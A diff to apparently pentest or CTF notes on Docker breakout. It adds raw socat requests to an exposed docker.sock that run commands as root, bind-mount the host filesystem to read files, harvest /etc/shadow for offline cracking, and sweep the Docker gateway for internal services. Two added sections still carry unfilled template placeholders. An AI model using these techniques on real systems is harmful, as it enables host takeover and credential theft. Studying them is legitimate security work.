@@ -21,8 +21,6 @@ Docker relies on Linux kernel features (namespaces, cgroups, capabilities) to is
 - Shell access inside a container (e.g. via web app RCE)
 - One of: privileged mode enabled, `docker` group membership, exposed Docker socket (`/var/run/docker.sock`), shared host namespace, or remote Docker API on port 2375
 
-## Methodology
-
 ### 1. Detect if inside a container
 
 ```bash
@@ -311,3 +309,43 @@ The same `sg <grp>`/`newgrp <grp>` trick applies to any group your effective UID
 current process' group set omits (`lxd`, `disk`, `adm`) after a setuid-only foothold. See [[linux-privesc]].
 
 <!-- promoted-slug: docker-group-newgrp-acquire -->
+
+## <Heading>
+
+<generic technique steps; no client host/IP/domain>
+
+## docker.sock via raw HTTP over socat (no docker CLI, ancient curl)
+
+When a container exposes `/var/run/docker.sock` but has no docker CLI, no python, no nc, and a curl too old for `--unix-socket` (pre-7.40, e.g. Debian 8), socat speaks the REST API directly if present:
+
+```sh
+printf 'GET /version HTTP/1.0\r\nHost: localhost\r\n\r\n' | socat -t 8 - UNIX-CONNECT:/var/run/docker.sock
+```
+
+- Any HTTP verb works the same way; POSTs need exact `Content-Length` and a `Connection: close` header. Parse returned Ids with `grep -o '"Id":"[a-f0-9]\{20,\}"'`.
+- File read as root WITHOUT a breakout container: `POST /v{api}/containers/{id}/exec` with `{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/path"]}`, then `POST /v{api}/exec/{eid}/start` with body `{}` - the response body is the raw stream.
+- Host file read: `POST /containers/create` with `{"Image":"<local-image>","Entrypoint":["cat","/host/root/root.txt"],"HostConfig":{"Binds":["/:/host"]}}`, start it, then `GET /containers/{id}/logs?stdout=1`. The Entrypoint override is REQUIRED for entrypoint images (official DB images etc.): a `Cmd` is passed to the image ENTRYPOINT and never executes.
+- Clean up with `DELETE /containers/{id}?force=1`.
+
+<!-- promoted-slug: docker-sock-socat-raw-api -->
+
+## <Heading>
+
+<generic technique steps; no client host/IP/domain>
+
+### The throwaway container as a HOST-recon primitive
+
+The single-file bind-mount read generalizes: point the override Entrypoint at a
+`bash -c` script that (a) harvests `/host/etc/shadow` + `/host/etc/passwd` for offline
+cracking, and (b) `/dev/tcp`-sweeps the docker gateway (`172.17.0.1`) for host services
+NOT published externally. Cap the log read (`head -c 2900`); the chunked logs endpoint
+truncates from the top and eats later sections otherwise. Check captured hashes cheaply
+before spinning up hashcat: `openssl passwd -6 -salt <salt> <candidate>` compares
+sha512crypt locally in one line per candidate.
+
+Read image build history through the same socket: `GET /images/<name>/history` returns
+per-layer `CreatedBy` lines exposing build-time commands (baked secrets, hardened sshd
+config, the chmod that opened the socket). `docker image save` needs the CLI; the REST
+endpoint does not.
+
+<!-- promoted-slug: docker-sock-socat-host-recon -->
